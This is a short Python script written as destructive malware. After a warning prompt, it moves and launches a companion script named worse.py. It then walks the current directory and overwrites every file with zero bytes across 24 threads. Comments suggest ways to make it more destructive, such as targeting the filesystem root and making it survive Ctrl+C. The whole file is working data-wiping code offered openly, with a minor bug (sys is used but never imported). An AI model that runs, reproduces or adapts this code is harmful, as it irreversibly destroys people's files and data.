input('Proceeding from here is DANGEROUS. Press ctrl + c to not destroy ur entire filesystem') # remove this line to get rid of the warning
import os
import subprocess
import shutil
from concurrent.futures import ThreadPoolExecutor

flist = []
try:
    if os.name == 'posix':
        source = os.path.expanduser("~/bad/dangerous/worse.py")
        destination = "/home/worse.py" #change to /worse.py for more destruction 
   

    elif os.name == 'nt':
        source = os.path.expanduser(r"~\bad\\dangerous\worse.py")
        destination = r"C:\Users" #change to C:\worse.py for more destruction (idk if it works but who cares)

    shutil.move(source, destination)
    subprocess.run(
        ["python3", "worse.py"], #change the linux one to include nohup at the start, and also add an exception handler that catches KeyboardInterupt to make sure the script stays running
        cwd="/home"
    )
except PermissionError:
    print("Run the script with admin or root")
    sys.exit()


for f in os.listdir():
    if f == "worse.py" or f == "bad.py":
        continue
    if os.path.isfile(f):
        flist.append(f)
    else:
        for root, dirs, files in os.walk(f):
            for file in files:
                flist.append(os.path.join(root, file))
def nuke(i):
    try:
        size = os.path.getsize(i)
        with open(i, 'wb') as g:
            g.write(b'\x00' * size)
            print("Nuked file: ", i)
    except Exception as e:
        print("Error: ", e)


with ThreadPoolExecutor(max_workers=24) as executor:
    executor.map(nuke, flist)
print('ggs')
